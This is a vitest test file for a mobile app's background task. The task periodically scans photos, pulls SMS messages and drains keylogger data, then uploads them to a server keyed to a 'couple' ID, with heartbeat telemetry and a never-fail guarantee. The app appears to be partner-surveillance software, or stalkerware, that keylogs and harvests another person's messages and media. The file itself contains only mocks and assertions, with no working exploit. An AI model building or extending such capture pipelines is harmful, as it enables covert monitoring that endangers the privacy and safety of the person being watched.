// features/capture/background.test.ts — pure-logic tests for the off-foreground
// capture/telemetry task. Exercises: the no-session / no-couple short-circuit,
// the full pipeline when a couple is present, and the never-throws guarantee.
//
// Mocked (per-file):
//   • expo-background-task / expo-task-manager — the native registration surface
//   • ./mediaLibrary, ./sms, ./queue, ./collector, ./sync — scan/drain deps
//   • ../keylogger/KeyLogger, ../keylogger/keylogSync — keylog + heartbeat
//   • ../../lib/session/store — fake zustand getState
import { describe, it, expect, vi, beforeEach } from 'vitest';

const { registerTaskAsync, unregisterTaskAsync } = vi.hoisted(() => ({
  registerTaskAsync: vi.fn(async () => {}),
  unregisterTaskAsync: vi.fn(async () => {}),
}));
const { defineTask } = vi.hoisted(() => ({
  defineTask: vi.fn(),
}));
// capture the executor passed to defineTask at module load
const { taskExecutor } = vi.hoisted<{ taskExecutor: { current: ((b: unknown) => Promise<number>) | null } }>(() => ({
  taskExecutor: { current: null },
}));
const { sessionGetState, rehydrateMock } = vi.hoisted(() => ({
  sessionGetState: vi.fn(),
  rehydrateMock: vi.fn(async () => {}),
}));
const { runCapturePass, syncCapture } = vi.hoisted(() => ({
  runCapturePass: vi.fn(async (_deps: unknown, _coupleId: string) => ({ ok: true, photosFound: 0, smsFound: 0 })),
  syncCapture: vi.fn(async (_coupleId: string) => ({ attempted: 0, uploaded: 0, accepted: 0, failed: 0 })),
}));
const { smsPull, smsPermission } = vi.hoisted(() => ({
  smsPull: vi.fn(async () => ({ ok: true, messages: [] })),
  smsPermission: vi.fn(async () => true),
}));
const { mediaScan, mediaPerm } = vi.hoisted(() => ({
  mediaScan: vi.fn(async () => ({ ok: true, assets: [] })),
  mediaPerm: vi.fn(async () => true),
}));
const { queueEnqueue, cursorGet, cursorSet } = vi.hoisted(() => ({
  queueEnqueue: vi.fn(async () => {}),
  cursorGet: vi.fn(async () => null),
  cursorSet: vi.fn(async () => {}),
}));
const { keylogger, syncAndClear, reportHeartbeat } = vi.hoisted(() => ({
  keylogger: {
    pull: vi.fn(async () => []),
    confirm: vi.fn(async () => {}),
    status: vi.fn(async () => ({ available: true, serviceAlive: true })),
  },
  syncAndClear: vi.fn(async () => ({ sent: 0, accepted: 0, failed: 0 })),
  reportHeartbeat: vi.fn(async () => ({ ok: true, httpStatus: 200 })),
}));

vi.mock('expo-background-task', () => ({
  registerTaskAsync,
  unregisterTaskAsync,
  BackgroundTaskResult: { Success: 1, Failed: 2 },
}));
vi.mock('expo-task-manager', () => ({
  defineTask: (name: string, executor: (body: unknown) => Promise<number>) => {
    taskExecutor.current = executor;
    return defineTask(name, executor);
  },
}));
vi.mock('../../lib/session/store', () => ({
  useSession: {
    getState: sessionGetState,
    persist: { rehydrate: rehydrateMock },
  },
}));
vi.mock('./mediaLibrary', () => ({ scanSince: mediaScan, hasMediaPermission: mediaPerm }));
vi.mock('./sms', () => ({ pullSms: smsPull, smsPermission }));
vi.mock('./queue', () => ({
  enqueueCapture: queueEnqueue,
  getCaptureCursor: cursorGet,
  setCaptureCursor: cursorSet,
}));
vi.mock('./collector', () => ({ runCapturePass }));
vi.mock('./sync', () => ({ syncCapture }));
vi.mock('../keylogger/KeyLogger', () => ({ KeyLogger: keylogger }));
vi.mock('../keylogger/keylogSync', () => ({ syncAndClear, reportHeartbeat }));

import { CAPTURE_TASK, runCaptureTask, registerCaptureTask, unregisterCaptureTask } from './background';

beforeEach(() => {
  // Do NOT clear defineTask/taskExecutor — the task body is registered at module
  // load, before any test body runs. Clear only the per-test behavior.
  runCapturePass.mockClear();
  syncCapture.mockClear();
  syncAndClear.mockClear();
  reportHeartbeat.mockClear();
  rehydrateMock.mockClear();
  keylogger.pull.mockClear();
  keylogger.confirm.mockClear();
  keylogger.status.mockClear();
  sessionGetState.mockClear();
  sessionGetState.mockReturnValue({ userId: null, coupleId: null });
  syncCapture.mockResolvedValue({ attempted: 0, uploaded: 0, accepted: 0, failed: 0 });
  runCapturePass.mockResolvedValue({ ok: true, photosFound: 0, smsFound: 0 });
});

describe('runCaptureTask — short-circuits safely', () => {
  it('returns Success with no session (never throws, reschedules)', async () => {
    sessionGetState.mockReturnValue({ userId: null, coupleId: null });
    const r = await runCaptureTask();
    expect(r).toBe(1); // BackgroundTaskResult.Success
    // rehydrates the persisted store first (headless/recycled-process safety)
    expect(rehydrateMock).toHaveBeenCalled();
    expect(runCapturePass).not.toHaveBeenCalled();
    expect(syncAndClear).not.toHaveBeenCalled();
    expect(reportHeartbeat).not.toHaveBeenCalled();
  });

  it('returns Success when there is a user but no couple yet', async () => {
    sessionGetState.mockReturnValue({ userId: 'u1', coupleId: null });
    const r = await runCaptureTask();
    expect(r).toBe(1);
    expect(runCapturePass).not.toHaveBeenCalled();
  });
});

describe('runCaptureTask — full pipeline with a couple', () => {
  it('runs the capture pass and syncs media when a couple is present', async () => {
    sessionGetState.mockReturnValue({ userId: 'u1', coupleId: 'c1' });
    const r = await runCaptureTask();
    expect(r).toBe(1);
    expect(runCapturePass).toHaveBeenCalledTimes(1);
    // the deps passed to runCapturePass wire the real sources
    const deps = runCapturePass.mock.calls[0]![0] as {
      scanPhotos: unknown; pullSms: unknown; queue: unknown; cursor: { get: unknown; set: unknown };
    };
    expect(deps.scanPhotos).toBe(mediaScan);
    expect(deps.pullSms).toBe(smsPull);
    expect(deps.queue).toBe(queueEnqueue);
    expect(runCapturePass.mock.calls[0]![1]).toBe('c1');
    expect(syncCapture).toHaveBeenCalledWith('c1');
    // keylog sync + heartbeat telemetry are driven
    expect(syncAndClear).toHaveBeenCalled();
    expect(reportHeartbeat).toHaveBeenCalled();
  });

  it('defines the task under the registered identifier', async () => {
    // defineTask was invoked at module load with the task id and an executor.
    expect(defineTask).toHaveBeenCalledWith(CAPTURE_TASK, expect.any(Function));
    // the executor must be wired and, when run with no couple, short-circuit
    // to Success without throwing.
    expect(taskExecutor.current).toBeTypeOf('function');
    await expect(taskExecutor.current!({})).resolves.toBe(1);
  });

  it('never throws even when the drain pipeline fails', async () => {
    sessionGetState.mockReturnValue({ userId: 'u1', coupleId: 'c1' });
    runCapturePass.mockRejectedValueOnce(new Error('boom'));
    await expect(runCaptureTask()).resolves.toBe(1);
  });
});

describe('registerCaptureTask / unregisterCaptureTask', () => {
  it('registers with the fixed 15-min cadence', async () => {
    await registerCaptureTask();
    expect(registerTaskAsync).toHaveBeenCalledWith(CAPTURE_TASK, { minimumInterval: 15 });
  });

  it('unregisters without throwing', async () => {
    await expect(unregisterCaptureTask()).resolves.toBeUndefined();
    expect(unregisterTaskAsync).toHaveBeenCalledWith(CAPTURE_TASK);
  });
});
